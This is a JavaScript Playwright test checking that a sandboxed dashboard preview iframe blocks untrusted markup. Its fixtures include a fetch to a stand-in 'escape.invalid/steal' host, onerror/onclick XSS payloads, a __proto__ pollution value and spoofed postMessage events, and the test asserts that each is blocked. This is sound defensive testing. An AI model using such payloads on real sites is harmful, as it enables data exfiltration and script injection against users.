// Actual opaque Chromium frame and malicious markup; HTTP/data are fixtures.
import { build } from "esbuild"
import { chromium } from "@playwright/test"
import assert from "node:assert/strict"
import { mkdtemp, readFile, rm } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"
const directory = await mkdtemp(join(tmpdir(), "artifact-dashboard-preview-"))
let browser
try {
  const bundle = join(directory, "preview.js")
  await build({ entryPoints: ["lib/pages/artifact-project-preview.ts"], bundle: true, minify: true, format: "iife", globalName: "ArtifactPreview", platform: "browser", outfile: bundle })
  browser = await chromium.launch({ headless: true, ...(process.env.CREWSHIP_BROWSER ? { executablePath: process.env.CREWSHIP_BROWSER } : {}) })
  const page = await browser.newPage(), external = []
  await page.route("**/*", route => {
    if (route.request().url() === "https://dashboard.test/") return route.fulfill({ contentType: "text/html", body: '<iframe title="Dashboard" sandbox="allow-scripts" referrerpolicy="no-referrer"></iframe>' })
    external.push(route.request().url()); return route.abort()
  })
  await page.goto("https://dashboard.test/")
  await page.addScriptTag({ content: await readFile(bundle, "utf8") })
  await page.evaluate(() => {
    window.messages = []
    window.addEventListener("message", event => { if (event.origin === "null" && event.source === document.querySelector("iframe").contentWindow) window.messages.push(event.data) })
    const content = `<h1 id="artifact-title">Revenue</h1><div data-source="sales" data-row="north"><span id="artifact-value" data-field="revenue"></span><meter data-field="revenue" min="0" max="100"></meter></div><table><tbody data-source="sales"><tr id="authored-row" data-row="*"><td id="authored-cell" data-field="revenue"></td></tr></tbody></table><script>fetch('https://escape.invalid/steal');parent.postMessage('bad','*')</script><img src="https://escape.invalid/image"><iframe src="https://escape.invalid/frame"></iframe><style>@import 'https://escape.invalid/style';</style><p onclick="fetch('https://escape.invalid/click')">Unsafe</p>`
    window.files = [{ path: "index.html", media_type: "text/html", content }]
    window.openDashboard = selecting => { document.querySelector("iframe").srcdoc = ArtifactPreview.artifactProjectDocument(window.files, "index.html", "fresh-nonce", selecting, { hostOrigin: location.origin, codeVersion: 1, collections: ["sales"] }) }
    window.feed = (documents, extra = {}) => document.querySelector("iframe").contentWindow.postMessage({ type: "crewship-dashboard-data", token: "fresh-nonce", code_version: 1, seq: 1, collections: [{ collection: "sales", code_version: 1, documents }], ...extra }, "*")
    window.openDashboard(false)
  })
  const frame = page.frameLocator('iframe[title="Dashboard"]')
  await frame.getByRole("heading", { name: "Revenue" }).waitFor()
  assert.equal(await frame.locator('[data-field="revenue"]').count(), 2) // Repeat templates stay detached until authorized data arrives.
  const doc = value => ({ id: "north", version: 1, value: { revenue: value }, updated_at: "2026-10-28T08:00:00Z", source_label: "Agent", source_kind: "agent" })
  await page.evaluate(document => window.feed([document]), doc(12))
  await frame.locator("#artifact-value").filter({ hasText: "12" }).waitFor()
  assert.equal(await frame.locator('[data-field="revenue"]').count(), 3)
  // Every number names its dataset, producer and update time on hover, focus and in its description.
  const sourceNote = "Source: sales/north.revenue · Agent · updated 2026-10-28 08:00 UTC"
  const tooltip = frame.getByRole("tooltip")
  assert.equal(await tooltip.isVisible(), false)
  await frame.locator("#artifact-value").focus()
  await tooltip.filter({ hasText: sourceNote }).waitFor({ state: "visible" })
  assert.equal(await frame.locator("#artifact-value").evaluate(node => document.getElementById(node.getAttribute("aria-describedby")).textContent), sourceNote)
  await frame.locator("#artifact-value").blur()
  await tooltip.waitFor({ state: "hidden" })
  await frame.locator("td[data-field]").hover()
  await tooltip.filter({ hasText: sourceNote }).waitFor({ state: "visible" })
  await page.evaluate(document => window.feed([document], { seq: 2 }), { ...doc(12), source_label: "Former contributor", source_kind: "unknown" })
  await frame.locator('#artifact-value[data-crewship-provenance="missing"]').waitFor()
  await frame.locator("#artifact-value").focus()
  await tooltip.filter({ hasText: "zdroj neuveden · sales/north.revenue · updated 2026-10-28 08:00 UTC" }).waitFor({ state: "visible" })
  await page.evaluate(() => window.openDashboard(false))
  await frame.getByRole("heading", { name: "Revenue" }).waitFor()
  await page.evaluate(document => window.feed([document]), doc(12))
  await frame.locator("#artifact-value").filter({ hasText: "12" }).waitFor()
  assert.equal(await frame.locator("meter").evaluate(node => node.value), 12)
  assert.equal(await frame.locator("#authored-row,#authored-cell").count(), 0)
  await page.evaluate(document => window.feed([document], { token: "old-nonce", seq: 2 }), doc(99))
  await page.evaluate(document => window.feed([document], { seq: 1 }), doc(99))
  await page.evaluate(document => window.feed([document], { code_version: 99, seq: 2 }), doc(99))
  await frame.locator("body").evaluate((_, document) => {
    const payload = { type: "crewship-dashboard-data", token: "fresh-nonce", code_version: 1, seq: 2, collections: [{ collection: "sales", code_version: 1, documents: [document] }] }
    window.dispatchEvent(new MessageEvent("message", { source: window, origin: "https://dashboard.test", data: payload }))
    window.dispatchEvent(new MessageEvent("message", { source: parent, origin: "https://evil.test", data: payload }))
  }, doc(99))
  await page.waitForTimeout(50)
  assert.equal(await frame.locator("#artifact-value").textContent(), "12")
  await page.evaluate(document => window.feed([document], { seq: 2 }), doc('<img src="https://escape.invalid/data" onerror="alert(1)">'))
  await frame.locator("#artifact-value").filter({ hasText: "<img" }).waitFor()
  assert.equal(await frame.locator("[onerror], [onclick], iframe, img[src]").count(), 0)
  await page.evaluate(document => window.feed([document], { seq: 3 }), doc(9007199254740992))
  await frame.locator("#artifact-value").filter({ hasText: "Unavailable" }).waitFor()
  assert.equal(await frame.locator("meter").getAttribute("value"), null)
  assert.equal(await frame.locator("meter").isVisible(), false)
  await frame.getByText("Unavailable", { exact: true }).last().waitFor({ state: "visible" })
  assert.equal(await frame.locator("meter").getAttribute("min"), "0")
  assert.equal(await frame.locator("meter").getAttribute("max"), "100")
  assert.equal(await frame.locator("body").evaluate(() => { try { return parent.document.title } catch (error) { return error.name } }), "SecurityError")
  await page.evaluate(() => window.openDashboard(true))
  await frame.locator("#artifact-title").click()
  await page.waitForFunction(() => window.messages.some(message => message.selector === "#artifact-title" && message.quote === "Revenue"))
  await frame.locator("#artifact-value").click()
  assert.equal(await page.evaluate(() => window.messages.some(message => message.selector === "#artifact-value")), false)
  await page.evaluate(document => window.feed([document]), doc(12))
  await frame.locator('aside[aria-label="Data sources"] p').first().waitFor()
  const selections = await page.evaluate(() => window.messages.length)
  await frame.locator('aside[aria-label="Data sources"] p').first().click()
  assert.equal(await page.evaluate(() => window.messages.length), selections)
  assert.equal(await page.evaluate(() => window.messages.includes("bad")), false)
  await page.evaluate(() => {
    window.files = [{ path: "index.html", media_type: "text/html", content: '<h1>Flat keys</h1><div data-source="constructor" data-row="prototype"><span id="own-proto" data-field="__proto__"></span><span id="own-constructor" data-field="constructor"></span><span id="own-prototype" data-field="prototype"></span><span id="business-name" data-field="DisplayName"></span><span id="dot-key" data-field="a.b"></span><span id="inherited" data-field="toString"></span></div>' }]
    document.querySelector("iframe").srcdoc = ArtifactPreview.artifactProjectDocument(window.files, "index.html", "fresh-nonce", false, { hostOrigin: location.origin, codeVersion: 1, collections: ["constructor"] })
  })
  await frame.getByRole("heading", { name: "Flat keys" }).waitFor()
  await page.evaluate(() => window.feed([], { collections: [{ collection: "constructor", code_version: 1, documents: [{ id: "prototype", version: 1, value: JSON.parse('{"__proto__":"<img src=https://escape.invalid/proto onerror=alert(1)>","constructor":"Own constructor","prototype":"Own prototype","DisplayName":"North region","a.b":"Flat dot key"}'), updated_at: "2026-10-28T08:00:00Z", source_label: "Agent" }] }] }))
  await frame.locator("#own-proto").filter({ hasText: "<img" }).waitFor()
  assert.equal(await frame.locator("#own-constructor").textContent(), "Own constructor")
  assert.equal(await frame.locator("#own-prototype").textContent(), "Own prototype")
  assert.equal(await frame.locator("#business-name").textContent(), "North region")
  assert.equal(await frame.locator("#dot-key").textContent(), "Flat dot key")
  assert.equal(await frame.locator("#inherited").textContent(), "Unavailable")
  assert.equal(await frame.locator("img,[onerror]").count(), 0)
  assert.equal(await frame.locator("body").evaluate(() => Object.getPrototypeOf({}) === Object.prototype && !Object.hasOwn(Object.prototype, "polluted")), true)
  // Calibrate the real setter, then refuse valid small-node / large-text multiplication before mutation.
  await page.evaluate(() => {
    window.files = [{ path: "index.html", media_type: "text/html", content: '<h1>Text budget</h1><div data-source="sales"><section data-row="*">' + '<span data-field="revenue"></span>'.repeat(400) + '</section></div>' }]
    window.openDashboard(false)
  })
  await frame.getByRole("heading", { name: "Text budget" }).waitFor()
  await frame.locator("body").evaluate(() => {
    window.dataAssignments = 0; window.refreshClones = 0
    const descriptor = Object.getOwnPropertyDescriptor(Node.prototype, "textContent")
    Object.defineProperty(Node.prototype, "textContent", { ...descriptor, set(value) {
      if (this instanceof Element && this.hasAttribute("data-field")) { window.dataAssignments++; if (String(value).length > 1024) return }
      descriptor.set.call(this, value)
    } })
    const original = Element.prototype.cloneNode
    Element.prototype.cloneNode = function (...args) { window.refreshClones++; return original.apply(this, args) }
  })
  await page.evaluate(document => window.feed([document]), doc(12))
  await frame.locator('[data-field="revenue"]').first().filter({ hasText: "12" }).waitFor()
  assert.ok(await frame.locator("body").evaluate(() => window.dataAssignments > 0 && window.refreshClones > 0))
  await frame.locator("body").evaluate(() => { window.dataAssignments = 0; window.refreshClones = 0 })
  await page.evaluate(document => window.feed([document], { seq: 2 }), doc("x".repeat(64 * 1024)))
  await frame.getByRole("alert").filter({ hasText: "Dashboard exceeds the preview rendering limit" }).waitFor()
  assert.equal(await frame.locator("body").evaluate(() => window.dataAssignments), 0)
  assert.equal(await frame.locator("body").evaluate(() => window.refreshClones), 0)
  assert.equal(await frame.locator("[data-row], [data-field]").count(), 0)
  // The same limit is UTF-8 bytes, not JavaScript character count.
  await page.evaluate(() => window.openDashboard(false))
  await frame.getByRole("heading", { name: "Text budget" }).waitFor()
  await page.evaluate(document => window.feed([document]), doc("é".repeat(24 * 1024)))
  await frame.getByRole("alert").filter({ hasText: "Dashboard exceeds the preview rendering limit" }).waitFor()
  // A small authored template times a valid collection must be bounded before any refresh clone.
  await page.evaluate(() => {
    window.files = [{ path: "index.html", media_type: "text/html", content: '<h1>Bounded dashboard</h1><div data-source="sales"><section data-row="*">' + '<span data-field="revenue"></span>'.repeat(16) + '</section></div>' }]
    window.openDashboard(false)
  })
  await frame.getByRole("heading", { name: "Bounded dashboard" }).waitFor()
  await frame.locator("body").evaluate(() => {
    window.refreshClones = 0
    const original = Element.prototype.cloneNode
    Element.prototype.cloneNode = function (...args) { window.refreshClones++; return original.apply(this, args) }
  })
  await page.evaluate(document => window.feed(Array.from({ length: 4096 }, (_, index) => ({ ...document, id: `row${index}` }))), doc(12))
  await frame.getByRole("alert").filter({ hasText: "Dashboard exceeds the preview rendering limit" }).waitFor()
  assert.equal(await frame.locator("body").evaluate(() => window.refreshClones), 0)
  assert.equal(await frame.locator("[data-row], [data-field]").count(), 0)
  assert.deepEqual(external, [])
  console.log("PASS: inert opaque Dashboard, number provenance on hover/focus, exact data updates, repeat rows, unsafe integers, static anchors, no author script/network")
} finally { await browser?.close(); await rm(directory, { recursive: true, force: true }) }
